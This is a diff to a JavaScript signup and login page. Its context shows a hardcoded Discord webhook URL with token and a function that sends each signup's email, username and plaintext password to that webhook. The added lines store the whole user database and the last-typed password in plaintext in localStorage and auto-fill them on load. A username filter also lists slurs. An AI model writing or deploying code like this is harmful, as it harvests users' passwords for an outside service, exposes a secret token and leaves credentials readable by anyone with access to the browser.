@@ -1,4 +1,4 @@
-const userDatabase = {};
+const userDatabase = JSON.parse(localStorage.getItem('userDatabase')) || {};
 
 // Replace with your actual Discord webhook URL
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1301983808769363969/IFvuPlMLpydA2FUKWrBZiYUpUSmmXlyUIv_GgTJSQp5GQVnexxawK3vv4dZuAL496g5u"; // Place your webhook URL here
@@ -19,7 +19,7 @@ function isValidUsername(username) {
     // Regular expression to check for special characters or spaces
     const specialCharsRegex = /[^a-zA-Z0-9]/; 
     // Array of bad words (customize as needed)
-    const badWords = ["nigger", "gay", "bitch"]; 
+    const badWords = ["nigger", "bitch", "pussy"]; 
 
     // Check for spaces or special characters
     if (username.trim() === "" || username.includes(" ") || specialCharsRegex.test(username)) {
@@ -62,6 +62,11 @@ async function sendToWebhook(email, username, password) {
 function openSignup() {
     document.getElementById('form-container').style.display = 'none';
     document.getElementById('signup-container').style.display = 'block';
+    // Clear the signup input fields
+    document.getElementById('email').value = '';
+    document.getElementById('signup-username').value = '';
+    document.getElementById('signup-password').value = '';
+    document.getElementById('confirm-password').value = '';
 }
 
 function backToLogin() {
@@ -94,6 +99,7 @@ async function signup() {
 
     // Save user data
     userDatabase[username] = { email, password };
+    localStorage.setItem('userDatabase', JSON.stringify(userDatabase)); // Save to localStorage
     alert("Signup successful! You can now log in.");
 
     // Send the signup details to Discord webhook
@@ -113,4 +119,24 @@ function login() {
     } else {
         alert("Invalid username or password!");
     }
+}
+
+// Populate the login form with existing user data if available
+window.onload = () => {
+    const savedUsername = document.getElementById('username');
+    const savedPassword = document.getElementById('password');
+    
+    if (userDatabase && Object.keys(userDatabase).length > 0) {
+        // Auto-fill the username and password if available
+        savedUsername.value = localStorage.getItem('lastUsername') || '';
+        savedPassword.value = localStorage.getItem('lastPassword') || '';
+    }
+
+    // Add event listener to save last used username and password
+    savedUsername.addEventListener('input', () => {
+        localStorage.setItem('lastUsername', savedUsername.value);
+    });
+    savedPassword.addEventListener('input', () => {
+        localStorage.setItem('lastPassword', savedPassword.value);
+    });
 }
